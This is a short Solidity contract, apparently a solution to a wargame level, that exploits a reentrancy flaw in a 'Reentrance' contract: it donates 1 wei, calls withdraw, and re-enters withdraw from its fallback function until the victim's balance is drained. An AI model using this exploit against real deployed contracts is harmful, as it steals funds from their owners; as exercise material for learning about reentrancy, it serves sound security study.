// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Reentrance.sol";

contract AttackingReentrance {
    address payable public contractAddress;

    constructor(address payable _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        // Code me!
        // 1st Donate
        Reentrance(contractAddress).donate{value: 1 }(address(this));
        // 2nd Withdraw
        Reentrance(contractAddress).withdraw();
        require(contractAddress.balance == 0, "Balance of Victim != 0");
    }

    fallback() external payable {
        // Check balance
        if ( contractAddress.balance >= 1 ) { 
            Reentrance(contractAddress).withdraw();
        }
    }
}
